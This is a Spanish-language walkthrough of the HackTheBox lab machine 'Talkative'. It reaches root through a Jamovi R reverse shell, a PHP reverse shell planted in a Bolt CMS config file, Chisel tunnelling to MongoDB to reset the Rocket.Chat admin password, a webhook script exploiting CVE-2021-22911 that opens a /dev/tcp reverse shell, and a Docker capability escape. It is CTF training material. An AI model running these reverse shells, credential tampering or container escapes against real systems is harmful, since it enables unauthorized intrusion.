---
title: HackTheBox - Talkative
author: nik0
date: 2022-08-27 12:06:00 +0800
categories: [HackTheBox]
tags: [HTB, Hard]
---

![1](/assets/img/sample/Talkative/Talkative.png) 

## Introducción

En este write up de la máquina Talkative, veremos temas como:

- [x] Explotación del servicio Jamovi
- [x] WebHook como vía de explotación/escalación
- [x] Escapando de contenedores Docker 

## Reconocimiento

Primero vamos a ejecutar un escaneo rápido de todos los puertos utilizando la herramienta Nmap con el siguiente comando:

```terminal
sudo nmap -p- -vvv -n -min-rate 5000 talkative.htb -oG nmap_scan
```

![1](/assets/img/sample/Talkative/1.png)


La razón por la cuál el output se ve así es porque está en modo grepeable(-oG) y utilizaremos una función llamada extractPorts que se coloca al final de .zshrc (en mi caso) para copiar los números de los puertos escaneados y así pegarlas en otro escaneo más robusto. Esta utilidad es muy útil sobretodo para enumerar máquinas Windows donde hay muchos puertos y el factor tiempo siempre es imprescindible a la hora de resolver máquinas.

```terminal
## Functions

function extractPorts(){
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address"  >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n"  >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n"  >> extractPorts.tmp
	cat extractPorts.tmp; rm extractPorts.tmp
}
```

Llamamos a la función en conjunto con el output de Nmap:

![1](/assets/img/sample/Talkative/2.png)

Luego añadimos esos puertos en el siguiente escaneo de Nmap:

```terminal
sudo nmap -sSCV -T4 -A -p80,3000,8080,8081,8082 -n -vvv talkative.htb -oN nmap_final
```

![1](/assets/img/sample/Talkative/3.png)

Podemos observar 5 puertos, los cuales ninguno posee exploits disponibles para sus versiones utilizando searchsploit, así que vamos a examinar el puerto 80 que corresponde a HTTP:

![1](/assets/img/sample/Talkative/4.png)


Vemos que es una página cuyo objetivo es establecer comunicaciones con otras personas (?), así que vamos a analizar que tecnologías usa con WhatWeb, que es similar a Wappalyzer(ponerlink) solo que se utiliza vía terminal.


![1](/assets/img/sample/Talkative/5.png)


Y nos nos arroja nada interesante, excepto por lo que ya sabemos del escaneo de nmap que utiliza una etiqueta meta de tipo "Bolt" y la cabecera PHP también utiliza esta tecnología por lo que podemos deducir que detrás de esta página se está utilizando un CMS Bolt.


Si seguimos interactuando con la página no encontraremos ningún vector de ataque, sin embargo al revisar el código fuente nos encontramos con información relevante:



![1](/assets/img/sample/Talkative/6.png)


Nos aparece un texto indicando que la tecnología también se apoya del servicio Rocket Chat para su funcionamiento, si nos dirigimos a la URL nos arroja lo siguiente: 


![1](/assets/img/sample/Talkative/7.png)


Ahora hemos descubierto el servicio que utiliza el puerto 3000 y una posible tecnología de CMS Bolt, si buscamos en la [**documentación**](https://docs.boltcms.io/5.0/manual/login) del CMS Bolt, podemos obtener una ruta de acceso a lo que parece ser el login y si lo ingresamos en http://talkative.htb/bolt nos redirecciona a la siguiente página:


![1](/assets/img/sample/Talkative/8.png)


Y efectivamente utiliza un CMS tipo Bolt que podremos utilizar más adelante. 



También vamos a buscar directorios ocultos que pudiesen estar disponibles con la herramienta Gobuster con el siguiente comando:

```terminal
gobuster dir -u http://talkative.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```


![1](/assets/img/sample/Talkative/9.png)


Pero no encontramos nada interesante que nos pueda brindar un acceso inicial.




Ahora seguimos examinando, esta vez el puerto 8080 que también corresponde a HTTP y que el escaneo de Nmap nos mostró que tiene cómo título Jamovi con un servicio Tornado versión 5.0. Si utilizamos WhatWeb nos arroja la misma información que mencionamos anteriormente. También si usamos Gobuster para buscar directorios ocultos no lograremos encontrar nada útil excepto un directorio llamado /version pero esto se explicará más adelante, así que procedemos a ingresar al sitio utilizando el puerto 8080.



![1](/assets/img/sample/Talkative/10.png)




## Acceso Inicial

¿Qué es Jamovi?

Según la web oficial "Jamovi es una hoja de cálculo avanzada que  permite la realización de cálculos estadísticos complejos de una manera  sencilla y eficiente, utiliza R como la infraestructura subyacente y aprovecha todas sus ventajas." entonces se podría intuir que es como un tipo de Excel (?) que utiliza R cómo lenguaje de soporte para el análisis de datos, manipulación de datos, gráficos, computación estadística y análisis estadístico. En resumen, el lenguaje R ayuda a analizar conjuntos de datos más allá del análisis básico de archivos de Excel.



Lo que yo siempre hago a la hora de encontrarme con un servicio desconocido, es utilizarlo cómo si fuese un usuario normal para así conocer su estructura, cómo opera los archivos y su funcionamiento en general. Como mencioné anteriormente se encontró un directorio llamado /version que contiene la version del Jamovi, así que lo que hice fué buscar exploits para esta versión y si había un [**exploit**](https://github.com/g33xter/CVE-2021-28079) que se basaba en un XSS pero requería de interacción de usuario así que perdí bastante tiempo tratando de hacer que funcionara.



Si buscamos en la documentación de Jamovi, nos encontramos con un apartado que menciona la ejecución de [**comandos**](https://www.jamovi.org/about-arbitrary-code.html) donde utilizamos RjEditor para efectuar esta tarea, ya que el lenguaje principal de Jamovi es R tenemos que configurar nuestra shell reversa en este lenguaje, aquí les dejo [**documentación**](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/system) donde indica el uso de la función "system" para ejecutar comandos de sistema en el lenguaje R.


Utilizando la cheatsheet de [**PentestMonkey**](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) y la documentación de R anteriormente mencionada, el comando a utilizar sería el siguiente:


```terminal
system("bash -c 'bash -i >& /dev/tcp/TUIP/TUPUERTO 0>&1'")
```


Ingresamos el comando dentro del RjEditor y ejecutamos(CTRL+SHIFT+ENTER):


![1](/assets/img/sample/Talkative/11.png)


Ahora si nos vamos a netcat, deberíamos de haber establecido la conexión de manera exitosa:


![1](/assets/img/sample/Talkative/12.png)


## Escalando Privilegios


Si ejecutamos el comando whoami nos indica que somos el usuario "root", sin embargo, no estamos habilitados para ejecutar ninguna acción como usuario administrativo del sistema así que vamos a tener que indagar dentro de los directorios y archivos para encontrar alguna credencial, servicio mal configurado u otras cosas.


Lo curioso es que la máquina no permite la ejecución de comandos tales como unzip, grep, curl, wget, nc, entre otras. Por lo que impide la posiblidad de subir herramientas de automatización que buscan rutas para escalar privilegios o subir cualquier otro archivo. Lo que yo hice en este caso fué buscar de manera manual entre los directorios y archivos, lo que si estaba disponible era el comando "find" con lo que también pude buscar binarios SUID o capacidades de Linux.



Si bien es cierto que no está disponible python, pero si está disponible python3 así que es posible convertir nuestra shell "tonta" a una shell full interactiva para ejecutar comandos como "clear" o manejar correctamente el SIGINT(Ctrl-C), les dejo mi [**script**](https://github.com/Nik0Sec/FullTTY) que automatiza este proceso en caso de que no quieran hacerlo de forma manual



Cuando terminemos de examinar el sistema a fondo, nos encontraremos con un archivo .omv en el directorio /root:


![1](/assets/img/sample/Talkative/13.png)



Ahora tenemos que analizar este archivo en nuestra máquina local, como no tenemos los servicios disponibles para transferir esto, vamos a convertir el archivo a base64 para copiarlo y decodificarlo en nuestra máquina.


Convertimos el archivo a base64: 

![1](/assets/img/sample/Talkative/14.png)


Luego lo transferimos a nuestra máquina con el siguiente comando:

```terminal
echo "ELBASE64" | base64 -d > bolt.omv
```

![1](/assets/img/sample/Talkative/15.png)

Ahora si hacemos un "file bolt.omv" podemos observar que es un archivo comprimido en zip, así que con 7z lo podemos descomprimir y nos da el siguiente resultado:

![1](/assets/img/sample/Talkative/16.png)

Vemos un archivo json el cual podemos procesarlo con jq para que sea más legible y nos revela unas credenciales:

![1](/assets/img/sample/Talkative/17.png)

Las guardamos y ahora las utilzaremos contra el CMS Bolt que hemos encontrado con anterioridad, no obstante, ninguna de las credenciales parece ser válida pero si usamos el usuario admin y la contraseña de Saul, podremos ingresar al panel:

![1](/assets/img/sample/Talkative/18.png)

Una vez dentro, nos vamos al apartado de configuración y luego donde se encuentran todos los archivos de configuración del sistema:

![1](/assets/img/sample/Talkative/19.png)

Luego observamos un archivo php llamado "bundles":

![1](/assets/img/sample/Talkative/20.png) 

El cual tenemos permiso para editarlo, aquí es donde borramos el contenido existente y lo reemplazamos por una shell reversa la cuál se encuentra por defecto en Kali Linux como se muestra a continuación:


Comando para copiar nuestra reverse shell al directorio que nos encontramos actualmente
```terminal
cp /usr/share/webshells/php/php-reverse-shell.php .
```

Utilizamos el comando sed para reemplazar la IP que viene por defecto en la reverse shell

```terminal
sed -i 's/127.0.0.1/TUIP/' php-reverse-shell.php
```

Y hacemos lo mismo con el puerto
```terminal
sed -i 's/1234/TUPUERTO/' php-reverse-shell.php
```


![1](/assets/img/sample/Talkative/21.png)

Ahora copiamos, guardamos cambios y reiniciamos la página:

![1](/assets/img/sample/Talkative/22.png)

Y ya tendríamos nuestra conexión:

![1](/assets/img/sample/Talkative/23.png)


Ahora no podemos utilizar nuestro script para obtener una shell interactiva, ya que, no existe python3 pero podemos utilizar este comando que nos ayudará a que la terminal se vea más legible:

```terminal
/usr/bin/script -qc /bin/bash /dev/null 
```


Al igual que en la otra máquina donde eramos "root", no nos permite ejecutar comandos como nc, ping, curl, wget, etc. Ahora si ejecutamos el comando "hostname" nos muestra una IP, que si ya hemos experimentado con contenedores Docker nos parecerá familiar, también mencionar el "nombre extraño" que se le asocia a la máquina, de la misma forma que se le asignan los identificadores Docker cuando se inicia una de estas.


Output del comando hostname:

![1](/assets/img/sample/Talkative/24.png)


Claramente estos son indicios de que estamos dentro de un contenedor, pero nos surge la siguiente pregunta:

¿Por qué se asigna esa IP al contenedor Docker? 


Como detalle de implementación, Docker asigna parte de ese rango de direcciones IP para cada red Docker que se crea. Dentro de ese rango de direcciones, normalmente la dirección .1 es el host y luego las direcciones se asignan secuencialmente para cada contenedor que está conectado a la red.

En la respuesta a la que se vincula, por ejemplo, es muy posible que Docker asigne 172.22.0.0/16 a la red que figura en el archivo docker-compose.yml. Entonces 172.22.0.1 sería el host, 172.22.0.2 sería el primer contenedor en docker-compose.yml y 172.22.0.3 sería el segundo (db). Cuando hay un error, por ejemplo, al conectarse a db:27017, la dirección resuelta puede imprimirse en el mensaje de error.

Si una dirección IP interna de Docker está codificada en algún lugar de su aplicación, probablemente sea un error.  No hay garantía de que se utilice la misma dirección o incluso la misma red si reinicia su contenedor en otro lugar. Estas direcciones tampoco son accesibles desde otros hosts; desde fuera de la VM, si Docker se está ejecutando en una VM;  e incluso desde procesos que no son de contenedor en el mismo host, excepto en sistemas Linux nativos.



Ya que conocemos como funciona el rango de direcciones IP asignadas para Docker, nos damos cuenta que la porción de host que nos asignaron es la número 16, por ende, debería de haber un servicio disponible en los hosts restantes.


Así que nos conectaremos mediante SSH con el usuario Saul y la IP con la porción de host principal en la misma máquina donde somos www-data:

![1](/assets/img/sample/Talkative/25.png)


Utilizamos la misma contraseña con la que ingresamos al CMS Bolt.


Una vez dentro buscaremos vectores para escalar privilegios, ahora usaremos una herramienta llamada [**pspy**](https://github.com/DominicBreuker/pspy) que permite ver procesos del sistema sin la necesidad de tener permisos administrativos.


Nos vamos al directorio /tmp y subimos nuestra herramienta, ahora si podemos utilizar wget:

![1](/assets/img/sample/Talkative/26.png)


Una vez ejecutado, nos damos cuenta de un servicio que se ejecuta con el UID=0 y corresponde a MongoDB:


![1](/assets/img/sample/Talkative/27.png)


Ahora podemos ejecutar el siguiente comando para ver todas las conexiones TCP que se efectúan en el sistema (En su máquina local, pueden hacer un "man netstat" para ver todos los comandos y sus respectivas descripciones):


```terminal
netstat -nat
```

Ahora si buscamos el puerto por defecto de MongoDB, corresponde al 27017 así que podemos ver que está en la 172.17.0.2 en la máquina:

![1](/assets/img/sample/Talkative/28.png)

Ahora necesitamos conectarnos a ese servicio pero primero debemos tunelizarlo, ya que, estamos dentro de un contenedor y no podremos acceder "desde afuera" así que utilizaremos Chisel para crear este túnel entre MongoDB y nuestra máquina local.



Transferimos Chisel a la máquina víctima y ejecutamos el siguiente comando:

```terminal
./chisel client 10.10.14.12:1414 R:27017:172.17.0.2:27017 
```

Luego en nuestra máquina local:

```terminal
chisel server --reverse --port 1414
```



![1](/assets/img/sample/Talkative/29.png)


Una vez listo el túnel, nos vamos a tener que conectar a MongoDB con una utilidad llamada MongoSH, no viene instalada por defecto en Kali así que van a tener que leer la documentación de su instalación.


![1](/assets/img/sample/Talkative/30.png)

Vemos unas bases de datos, ingresamos la DB llamada meteor y mostramos sus tablas:


![1](/assets/img/sample/Talkative/31.png)


Hay un "_id" que nos indica que esta base de datos está siendo utilizada por el servicio RocketChat en el puerto 3000 y las contraseñas almacenadas está en hashes tipo Bcrypt. Por lo que tenemos la posibilidad de cambiar la contraseña del administrador con el siguiente comando:

```terminal
db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })
```

La contraseña ahora será "12345"


![1](/assets/img/sample/Talkative/32.png)



Ya que hemos ingresado al panel de RocketChat, vemos la versión y encontramos un exploit de NoSQL para esa versión https://github.com/CsEnox/CVE-2021-22911 donde explica detalladamente como explotar este fallo.



Por lo que ahora debemos ingresar en Administration y luego en Integrations:


![1](/assets/img/sample/Talkative/33.png)

Luego en New Integration:

![1](/assets/img/sample/Talkative/34.png) 

Ahora en Incoming WebHook:


![1](/assets/img/sample/Talkative/35.png)

Lo más importante para modificar, es el parámetro "Post to channel" y "Post as" al igual que "Script Enabled" en True para que se ejecute nuestra shell reversa que sacamos del POC.

```terminal
const require = console.log.constructor('return process.mainModule.require')();
require('child_process').exec('bash -c "bash -i >& /dev/tcp/10.10.14.12/7777 0>&1"');
```

![1](/assets/img/sample/Talkative/36.png)

Ahora guardamos los cambios, recargamos la página y buscamos la URL donde se encuentra el WebHook almacenado:

![1](/assets/img/sample/Talkative/37.png) 

En nuestra máquina, tenemos que llamar al webhook con Curl:

![1](/assets/img/sample/Talkative/38.png) 

Y nuevamente deberíamos estar en un contenedor:

![1](/assets/img/sample/Talkative/39.png)

Ya que no podemos enumerar de forma manual si existen binarios SUID, capacidades de Linux mal configuradas u otras cosas. Vamos a utilizar una herramienta llamada pwncat que funciona como "wrapper" para las conexiones reversas, vendría siendo como un netcat con esteroides, por lo que vamos a hacer el mismo proceso, solo que ahora poniendo a la escucha pwncat.

![1](/assets/img/sample/Talkative/40.png)

Una vez listo subimos una herrameinta llamada [**cdk**](https://github.com/cdk-team/CDK) que su principal objetivo es enumerar vías de escalación de privilegios en contenidos docker, si nos fijamos bien nos recomienda un exploit para las capacidades de Linux "CAP_DAC_READ_SEARCH" así que utlizamos el comando que nos sugiere:

![1](/assets/img/sample/Talkative/41.png)


Y listo, ya somos root ;)




